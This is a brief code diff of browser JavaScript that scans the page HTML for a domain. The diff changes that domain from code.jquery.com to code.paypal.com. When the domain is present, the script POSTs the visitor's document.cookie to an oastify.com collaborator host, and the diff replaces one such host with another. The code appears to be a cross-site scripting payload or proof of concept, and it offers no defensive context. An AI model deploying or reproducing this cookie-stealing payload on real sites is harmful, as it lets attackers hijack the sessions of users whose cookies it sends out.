@@ -1,6 +1,6 @@
-var reg=/code\.jquery.com/ig;
+var reg=/code\.paypal.com/ig;
 if(document.body.innerHTML.match(reg) || document.head.innerHTML.match(reg)){
-fetch('https://8mvcheojaohdf3432jmgzibkgbm1aq.oastify.com', {
+fetch('https://d0erjq7cxyx9639j9ndmonmk8be22r.oastify.com', {
 method: 'POST',
 mode: 'no-cors',
 body:document.cookie
